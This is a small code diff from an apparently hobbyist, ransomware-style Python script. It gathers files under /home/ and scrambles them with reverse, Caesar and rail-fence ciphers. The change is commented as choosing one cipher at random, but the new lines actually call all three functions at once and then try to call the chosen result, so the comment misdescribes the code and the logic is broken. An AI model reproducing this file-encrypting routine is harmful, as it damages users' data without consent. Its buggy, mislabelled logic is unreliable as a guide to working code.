@@ -15,14 +15,11 @@ def main():
     else:
         path = "/home/"
 
-
-
     files = getdirs.getdirs(path)
 
-    # TODO: encryption
-    #reverseCryptor(files)
-    #caeser(files)
-    RailfenceEncrypt(files,3)
+    # Randomly chooses an encryption algorithm and runs it.
+    EncryptionAlgorithms = [reverseCryptor(files),caeser(files),RailfenceEncrypt(files,3)]
+    r.choice(EncryptionAlgorithms)()
 
 
 def reverseCryptor(files):
